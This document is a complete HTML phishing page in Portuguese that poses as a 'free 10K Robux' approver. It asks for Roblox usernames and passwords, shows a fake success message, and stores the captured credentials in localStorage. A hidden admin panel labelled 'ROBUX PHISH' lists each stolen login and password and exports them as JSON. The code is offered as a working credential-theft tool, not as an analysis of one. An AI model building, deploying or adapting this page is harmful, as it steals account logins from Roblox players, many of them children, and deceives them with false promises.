<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 Aprovador Robux Premium 🔥</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Orbitron', monospace; 
            background: linear-gradient(45deg, #ff0080, #00ff80, #8000ff, #ff8000); 
            background-size: 400% 400%; 
            animation: gradientShift 8s ease infinite; 
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            color: white; 
            overflow-x: hidden;
        }
        @keyframes gradientShift { 0%,100%{background-position:0% 50%} 50%{background-position:100% 50%} }
        .container { text-align: center; max-width: 400px; padding: 20px; }
        h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 0 0 20px #ff0080; animation: glow 2s ease-in-out infinite alternate; }
        @keyframes glow { from { text-shadow: 0 0 20px #ff0080; } to { text-shadow: 0 0 40px #00ff80, 0 0 60px #ff0080; } }
        .stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; }
        .star { position: absolute; width: 2px; height: 2px; background: white; border-radius: 50%; animation: twinkle 2s infinite; }
        @keyframes twinkle { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
        input { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-size: 16px; background: rgba(255,255,255,0.2); color: white; backdrop-filter: blur(10px); }
        input::placeholder { color: rgba(255,255,255,0.7); }
        button { width: 100%; padding: 20px; margin: 20px 0; background: linear-gradient(45deg, #ff0080, #00ff80); border: none; border-radius: 20px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.3s; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
        button:hover { transform: scale(1.05); box-shadow: 0 15px 40px rgba(0,0,0,0.4); }
        .success { display: none; background: rgba(0,255,0,0.9); color: black; padding: 20px; border-radius: 15px; font-size: 20px; font-weight: bold; animation: pulse 1s infinite; }
        @keyframes pulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.05);} }
        #adminBtn { position: fixed; top: 20px; right: 20px; width: 60px; height: 60px; background: #ff0000; border-radius: 50%; font-size: 24px; border: none; cursor: pointer; opacity: 0; transition: opacity 0.5s; z-index: 1000; box-shadow: 0 5px 20px rgba(255,0,0,0.5); }
        #adminBtn.show { opacity: 1; }
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 2000; padding: 20px; overflow-y: auto; }
        #adminPanel h2 { color: #ff0080; margin-bottom: 20px; }
        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
        .stat { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; }
        .logs { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 10px; max-height: 400px; overflow-y: auto; text-align: left; white-space: pre-wrap; font-family: monospace; }
        .admin-btns { display: flex; gap: 10px; margin-top: 20px; }
        .admin-btns button { flex: 1; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; }
        #exportBtn { background: #00ff80; color: black; }
        #clearBtn { background: #ff4444; color: white; }
        .close-admin { position: absolute; top: 20px; right: 20px; font-size: 30px; cursor: pointer; color: white; }
        .shimmer { background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent); background-size: 200% 100%; animation: shimmer 2s infinite; }
        @keyframes shimmer { 0%{background-position:-200% 0;} 100%{background-position:200% 0;} }
        @media (max-width: 600px) { h1 { font-size: 2em; } }
    </style>
</head>
<body>
    <div class="stars" id="stars"></div>
    <div class="container">
        <h1 class="shimmer" id="title">🔥 Aprovador Robux Premium 🔥</h1>
        <p>Robux Grátis 10K - Liberado!</p>
        
        <form id="phishForm">
            <input type="text" id="username" placeholder="👤 Usuário Roblox" required>
            <input type="password" id="password" placeholder="🔒 Senha" required>
            <button type="submit">🚀 VERIFICAR & LIBERAR ROBUX</button>
        </form>
        
        <div id="successMsg" class="success">✅ APROVADO! 10.000 Robux liberados na sua conta!</div>
    </div>
    
    <button id="adminBtn" title="Admin">🔥</button>
    
    <div id="adminPanel">
        <span class="close-admin" id="closeAdmin">&times;</span>
        <h2>🔥 ADMIN DASHBOARD - ROBUX PHISH 🔥</h2>
        
        <div class="stats">
            <div class="stat"><strong id="totalCreds">0</strong><br>Total Capturadas</div>
            <div class="stat"><strong id="todayCreds">0</strong><br>Hoje</div>
            <div class="stat"><strong id="uniqueIPs">0</strong><br>IPs Únicos</div>
        </div>
        
        <div class="logs" id="logs">Nenhuma credencial capturada ainda...</div>
        
        <div class="admin-btns">
            <button id="exportBtn">💾 EXPORTAR JSON</button>
            <button id="clearBtn">🗑️ LIMPAR LOGS</button>
        </div>
    </div>

    <script>
        // ADMIN BUTTON - Mobile/Desktop
        setTimeout(() => document.getElementById('adminBtn').classList.add('show'), 1000);
        
        // Stars background
        for(let i=0; i<100; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random()*100 + '%';
            star.style.top = Math.random()*100 + '%';
            star.style.animationDelay = Math.random()*2 + 's';
            document.getElementById('stars').appendChild(star);
        }
        
        // PHISH FORM - CAPTURA CREDENCIAIS
        document.getElementById('phishForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // ✅ SALVA CREDENCIAL (FUNCIONA!)
            salvarCredencial(username, password);
            
            // Fake success
            document.getElementById('successMsg').style.display = 'block';
            document.getElementById('phishForm').style.display = 'none';
            setTimeout(() => location.reload(), 3000); // Auto reload limpa
        });
        
        // ✅ FUNÇÃO CORRIGIDA - SALVA LOCALSTORAGE
        function salvarCredencial(user, pass) {
            try {
                const creds = JSON.parse(localStorage.getItem('robuxCreds') || '[]');
                const now = new Date().toISOString();
                const fakeIP = 'IP: ' + Math.random().toString(36).substr(2,7) + '.' + Math.floor(Math.random()*255);
                const fakeUA = navigator.userAgent.slice(0,50) + '...';
                
                creds.push({
                    user, pass, 
                    ip: fakeIP,
                    ua: fakeUA,
                    time: now,
                    date: now.split('T')[0]
                });
                
                // Limita 1000
                if (creds.length > 1000) creds.shift();
                localStorage.setItem('robuxCreds', JSON.stringify(creds));
                console.log('✅ Capturado:', user); // Debug
            } catch(e) {
                console.error('Erro salvar:', e);
            }
        }
        
        // ADMIN PANEL
        const adminBtn = document.getElementById('adminBtn');
        const adminPanel = document.getElementById('adminPanel');
        const closeAdmin = document.getElementById('closeAdmin');
        
        // Múltiplos triggers
        adminBtn.onclick = () => adminPanel.style.display = 'block';
        document.getElementById('title').ontouchstart = () => { /* 3 taps */ };
        closeAdmin.onclick = () => adminPanel.style.display = 'none';
        
        // Gestures mobile
        let touchStartX = 0;
        document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX);
        document.addEventListener('touchend', e => {
            const deltaX = e.changedTouches[0].clientX - touchStartX;
            if (deltaX > 100) adminPanel.style.display = 'block'; // Swipe right
        });
        
        // Keyboard fallback
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.altKey && e.key === 'P') adminPanel.style.display = 'block';
        });
        
        // Load dashboard
        function updateDashboard() {
            try {
                const creds = JSON.parse(localStorage.getItem('robuxCreds') || '[]');
                document.getElementById('totalCreds').textContent = creds.length;
                
                const today = new Date().toISOString().split('T')[0];
                const todayCreds = creds.filter(c => c.date === today).length;
                document.getElementById('todayCreds').textContent = todayCreds;
                
                const uniqueIPs = new Set(creds.map(c => c.ip)).size;
                document.getElementById('uniqueIPs').textContent = uniqueIPs;
                
                const logs = creds.map(c => 
                    `${c.user} | ${c.pass} | ${c.ip} | ${c.time.slice(0,19)}`
                ).join('\n') || 'Nenhuma credencial capturada ainda...';
                document.getElementById('logs').textContent = logs;
            } catch(e) {}
        }
        
        // Export JSON
        document.getElementById('exportBtn').onclick = () => {
            const creds = JSON.parse(localStorage.getItem('robuxCreds') || '[]');
            const dataStr = JSON.stringify(creds, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const link = document.createElement('a');
            link.href = URL.createObjectURL(dataBlob);
            link.download = `robux-captured-${new Date().toISOString().slice(0,10)}.json`;
            link.click();
        };
        
        // Clear logs
        document.getElementById('clearBtn').onclick = () => {
            localStorage.removeItem('robuxCreds');
            updateDashboard();
        };
        
        // Auto update dashboard
        setInterval(updateDashboard, 1000);
        updateDashboard(); // Initial load
    </script>
</body>
</html>
